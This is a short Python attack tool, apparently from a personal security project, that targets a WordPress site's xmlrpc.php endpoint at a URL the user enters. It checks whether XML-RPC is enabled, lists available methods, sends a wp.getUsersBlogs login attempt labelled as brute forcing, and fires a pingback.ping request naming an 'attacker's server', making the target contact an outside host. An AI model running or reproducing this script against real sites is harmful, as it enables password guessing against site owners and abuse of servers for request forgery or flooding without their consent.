import requests
banner="""
o      O Oo      oO  o                oOoOOoOOo `OooOOo.   .oOOOo.  o.     O 
 O    o  O O    o o O                     o      o     `o .O     o. Oo     o 
  o  O   o  o  O  O o                     o      O      O O       o O O    O 
   oO    O   Oo   O o                     O      o     .O o       O O  o   o 
   Oo    O        o O       ooooooooo     o      OOooOO'  O       o O   o  O 
  o  o   o        O O                     O      o    o   o       O o    O O 
 O    O  o        O o     .               O      O     O  `o     O' o     Oo 
O      o O        o OOoOooO               o'     O      o  `OoooO'  O     `o 

https://in.linkedin.com/in/gurudatt-choudhary
"""
print(banner)
print("eg:https://example.com OR https://www.example.com \n")
target = input("Enter Target URL: ")

check_xml_response = requests.get(url=target+"/xmlrpc.php")
if "XML-RPC server accepts POST requests only." in check_xml_response.text:
    print(check_xml_response.text)
    print("XML enabled Found, Changing Mathod From GET to POST")
    check_xml_response = requests.post(url=target+"/xmlrpc.php")
    print(check_xml_response.status_code,check_xml_response.text)
else:
    print("This Website Dont Use XMLRPC")

choose = int(input("Choose Option: "))
if choose == 1:
        
    listmathod = """<methodCall>
    <methodName>system.listMethods</methodName>
    <params></params>
    </methodCall>"""
    available_mathod_response = requests.post(url=target+"/xmlrpc.php",data=listmathod)
    print(available_mathod_response.text)
    
elif choose ==2 :
    brutemathod = """<methodCall>
    <methodName>wp.getUsersBlogs</methodName>
    <params>
    <param><value>admin</value></param>
    <param><value>pass</value></param>
    </params>
    </methodCall>"""
    brute_response = requests.post(url=target+"/xmlrpc.php",data=brutemathod)
    print(brute_response.text)
    
elif choose ==3:
    attacker_server = input("Enter Attacker's Server Address with (http:// or https://) :")
    blog = target+"/hello-world"

    pingbackmethod = """
    <methodCall>
    <methodName>pingback.ping</methodName>
    <params><param>
    <value><string>"""+attacker_server+"""</string></value></param>
    <param><value><string>"""+blog+"""</string></value></param></params></methodCall>"""

    pingback_response = requests.post(url=target+"/xmlrpc.php",data=pingbackmethod)
    print(pingback_response.status_code,pingback_response.text)
